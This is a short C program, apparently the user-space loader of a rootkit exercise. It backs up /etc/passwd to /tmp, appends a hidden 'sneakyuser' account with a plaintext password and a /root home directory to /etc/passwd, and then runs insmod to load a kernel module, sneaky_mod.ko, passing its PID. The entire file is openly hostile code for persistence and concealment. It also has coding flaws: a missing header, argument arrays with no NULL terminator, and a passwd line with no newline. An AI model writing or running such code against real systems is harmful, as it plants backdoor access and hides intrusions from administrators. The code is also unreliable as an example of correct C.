#include <stdlib.h>
#include <stdio.h>
#include <string.h>
int main() {
  int rc = fork();  
  printf("sneaky_process pid=%d\n", getpid());
  if (rc < 0) {
    fprintf(stderr, "fork failed\n");
    exit(1);
  } else if (rc == 0) {
    char * myargs[3];
    myargs[0] = strdup("cp");
    myargs[1] = strdup("/etc/passwd");
    myargs[2] = strdup("/tmp/passwd");
    execvp(myargs[0], myargs);
  } else {        
    FILE * target = fopen("/etc/passwd", "a");
    char append[] = "sneakyuser:abc123:2000:2000:sneakyuser:/root:bash";
    fprintf(target, "%s", append); 
    fclose(target);  
    int _rc = fork();
    printf("sneaky_process pid=%d\n", getpid()); 
    if (_rc == 0) {      
      char * args[3];
      args[0] = strdup("insmod");
      args[1] = strdup("sneaky_mod.ko");   
      char buf[20];
      sprintf(buf, "PID = %d", getpid());
      args[2] = strdup(buf);    
      printf("HERE\n");
      execvp(args[0], args);  
    } else {
    
      

      
    }
    
  }
  return 0;
}


